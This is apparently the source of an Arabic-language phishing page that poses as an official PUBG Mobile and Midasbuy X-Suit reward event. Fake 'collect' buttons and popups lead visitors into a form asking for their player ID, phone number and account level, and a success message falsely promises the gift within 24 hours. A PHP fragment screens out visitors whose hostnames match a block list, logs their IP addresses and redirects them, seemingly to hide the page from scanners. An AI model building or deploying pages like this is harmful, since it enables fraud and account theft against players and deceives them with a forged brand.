...
<meta property="og:title" content="First Ultimate Quality X-Suit Release">
<meta name="description" content="Iridescence X-Suit & Golden Pharaoh X-Suit (7-Star)">
<meta property="og:description" content="Iridescence X-Suit & Golden Pharaoh X-Suit (7-Star)">
<meta property="og:url" content="./">
<meta property="og:site_name" content="First Ultimate Quality X-Suit Release">
<meta property="og:type" content="website">
<meta name="copyright"content="PUBG MOBILE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://www.pubgmobile.com/images/event/Iridescencex_suit/share/en.jpg">
<title>First Ultimate Quality X-Suit Release</title>
...
<div class="event-notification-content"><i class="zmdi zmdi-chevron-right"></i>Pubg Mobile X Midasbuy <div class="event-notification-content-timer"><i class="zmdi zmdi-timer"></i><span id="latestTimer"></span></div></div> <!--- event-notification-content --->
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/1.jpg">جمع</button>
</div>
</div>
<div class="item itemShine">
<div>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/2.jpg">جمع</button>
</div>
</div>
<div class="item itemShine">
<div>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/3.jpg">جمع</button>
</div>
</div>
<div class="item itemShine">
<div>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/4.jpg">جمع</button>
</div>
</div>
<div class="item itemShine">
<div>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/5.jpg">جمع</button>
</div>
</div>
<div class="item itemShine">
<div>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/6.jpg">جمع</button>
</div>
</div>
<div class="item itemShine">
<div>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/7.jpg">جمع</button>
</div>
</div>
<div class="item itemShine">
<div>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/8.jpg">جمع</button>
</div>
</div>
<div class="item itemShine">
<div>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/9.jpg">جمع</button>
</div>
</div> <!--- tab-rewards --->
</center>
</div> <!--- box --->
...
<div class="popup-alert">هل انت متأكد من جمع هذه المكافأة ؟</div> <!--- popup-alert --->
...
<button type="button" onmousedown="buka.play();" onclick="open_account_login()">جمع الآن</button>
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->
...
<div class="popup-box-bg">
<div class="popup-alert">يجب عليك التسجيل اولآ</div> <!--- popup-alert --->
...
<img src="http://pubgmobile.com/common/images/icon_logo.jpg">
...
<div class="popup-box-bg">
<div class="popup-alert">PUBG MOBILE ادخل بيانات حسابك في </div> <!--- popup-alert --->
...
<input type="number" name="playid" id="playid" placeholder="معرف الاعب ID" autocomplete="off" required>
<input type="number" name="phone" id="phone" placeholder="رقم هاتفك" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Phone Number')" oninput="setCustomValidity('')">
<select name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">مستوي حسابك</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
...
<div class="popup-box-bg">
<div class="popup-alert">
✅ لقد تم التسجيل فالحدث بنجاح
<br>
<br> 
نتمني انك قمت بكتابه بياناتك بشكل صحيح ♻️
<br>
🕗 سيتم ارسال هديتك خلال ٢٤ ساعه 
</div> <!--- popup-alert --->
<div class="popup-footer">
<button type="button" onmousedown="tutup.play();" style="background: url(img/menu_on.png) no-repeat center center; background-size: 100% 100%;" onclick="location.href='https://t.co/3LLsq5Wppj';">متابعه</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->
...
if(inStr($host_korban, $blocked_words)){
    ...
    fwrite($file, $date." : ".$_SERVER['REMOTE_ADDR']." - ".gethostbyaddr($_SERVER['REMOTE_ADDR'])."\n");
    fclose($file);
    header("Location: ../cgi/d41d8cd98f00b20/");
}
